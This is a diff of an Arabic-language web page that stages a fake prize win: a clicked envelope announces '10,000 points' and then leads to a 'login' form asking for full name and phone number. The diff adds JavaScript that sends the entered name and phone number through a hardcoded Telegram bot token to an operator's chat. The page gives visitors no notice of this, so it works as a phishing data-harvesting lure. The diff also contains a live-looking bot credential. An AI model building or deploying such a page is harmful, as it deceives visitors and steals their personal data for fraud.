@@ -8,16 +8,16 @@
 <style>
 :root{--red:#d32f2f;--bg:#f5f5f5}
 *{box-sizing:border-box}
-body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
+body{margin:0;font-family:tahoma;background:var(--bg)}
 .step{display:none}
 .step.active{display:block}
 
-/* Header */
+/* header */
 .header{background:var(--red);color:#fff;padding:14px;text-align:center;font-weight:bold}
 .flag{font-size:28px;display:block}
-.sub{text-align:center;margin:10px 0;color:#555;font-size:14px}
+.sub{text-align:center;color:#555;margin:10px 0}
 
-/* Envelopes */
+/* envelopes */
 .envelopes{
   max-width:420px;margin:16px auto;
   display:grid;grid-template-columns:repeat(3,1fr);
@@ -26,20 +26,19 @@ body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
 .env{
   position:relative;height:120px;
   background:#e6e6e6;border-radius:12px;
-  overflow:hidden;cursor:pointer;
+  cursor:pointer;overflow:hidden;
   box-shadow:0 6px 12px rgba(0,0,0,.12)
 }
 .env .lid{
   position:absolute;top:0;left:0;right:0;height:55%;
   background:#dcdcdc;
-  transform-origin:top center;
-  transition:transform .6s ease;
+  transform-origin:top;
+  transition:.6s
 }
 .env .body{
   position:absolute;inset:0;
   display:flex;align-items:center;justify-content:center;
-  font-size:22px;color:#777;
-  text-align:center;padding:10px
+  text-align:center;font-size:20px;color:#777
 }
 .env.opened .lid{transform:rotateX(160deg)}
 .env.opened .body{
@@ -49,16 +48,13 @@ body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
   line-height:1.6
 }
 
-/* Result */
-.result{text-align:center;font-size:18px;color:var(--red);min-height:24px}
+/* form */
+.center{max-width:420px;margin:auto;padding:12px}
+.card{background:#fff;border-radius:12px;padding:16px;box-shadow:0 10px 20px rgba(0,0,0,.12)}
+.input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;margin-bottom:10px}
+.btn{width:100%;padding:12px;border:none;border-radius:10px;background:var(--red);color:#fff;font-size:16px;cursor:pointer}
 
-/* Form */
-.center{max-width:420px;margin:0 auto;padding:12px}
-.card{background:#fff;border-radius:12px;box-shadow:0 10px 20px rgba(0,0,0,.12);padding:16px}
-.input{width:100%;padding:12px;border-radius:8px;border:1px solid #ddd;margin-bottom:10px}
-.btn{width:100%;padding:12px;border-radius:10px;border:none;background:var(--red);color:#fff;font-size:16px;cursor:pointer}
-
-.footer{text-align:center;color:#777;font-size:12px;margin:18px 0}
+.footer{text-align:center;color:#777;margin:20px 0;font-size:12px}
 </style>
 </head>
 
@@ -80,8 +76,6 @@ body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
     <div class="env"><div class="lid"></div><div class="body">✉️</div></div>
     <div class="env"><div class="lid"></div><div class="body">✉️</div></div>
   </div>
-
-  <div id="result" class="result"></div>
 </section>
 
 <!-- STEP 2 -->
@@ -91,7 +85,7 @@ body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
       <h3 style="text-align:center;margin-top:0">تسجيل الدخول</h3>
       <input class="input" id="name" placeholder="الاسم الكامل">
       <input class="input" id="phone" placeholder="رقم الهاتف">
-      <button class="btn">متابعة</button>
+      <button class="btn" onclick="sendToTelegram()">متابعة</button>
     </div>
   </div>
 </section>
@@ -99,30 +93,64 @@ body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
 <div class="footer">© 2025</div>
 
 <script>
-let locked=false;
+let locked = false;
 
-/* ربط الأظرف */
+/* إعدادات تلغرام */
+const BOT_TOKEN = "8530299273:AAHH0iDVc60tDNnxtTuqDS17DWPXIBl9X50";
+const CHAT_ID   = "5516597110";
+
+/* فتح الظرف */
 document.querySelectorAll('.env').forEach(env=>{
-  env.addEventListener('click',()=>{
+  env.addEventListener('click', ()=>{
     if(locked) return;
-    locked=true;
+    locked = true;
 
     env.classList.add('opened');
-
-    // رسالة داخل الظرف
     env.querySelector('.body').innerHTML =
       "🎉 <strong>ربحت</strong><br>💰 <strong>10,000 نقطة</strong>";
 
-    document.getElementById('result').textContent =
-      "تم الفوز بنجاح";
-
-    // ⏱️ بعد 3 ثواني → صفحة التسجيل
+    // بعد 3 ثواني انتقل للتسجيل
     setTimeout(()=>{
       document.getElementById('step1').classList.remove('active');
       document.getElementById('step2').classList.add('active');
     }, 3000);
   });
 });
+
+/* إرسال إلى تلغرام */
+function sendToTelegram(){
+  const name  = document.getElementById('name').value.trim();
+  const phone = document.getElementById('phone').value.trim();
+
+  if(!name || !phone){
+    alert("يرجى إدخال الاسم والرقم");
+    return;
+  }
+
+  const text =
+    "📥 تسجيل جديد\n\n" +
+    "👤 الاسم: " + name + "\n" +
+    "📞 الرقم: " + phone + "\n" +
+    "🕒 " + new Date().toLocaleString();
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text
+    })
+  })
+  .then(res=>res.json())
+  .then(()=>{
+    alert("تم إرسال المعلومات بنجاح ✅");
+    document.getElementById('name').value="";
+    document.getElementById('phone').value="";
+  })
+  .catch(()=>{
+    alert("حصل خطأ ❌");
+  });
+}
 </script>
 
 </body>
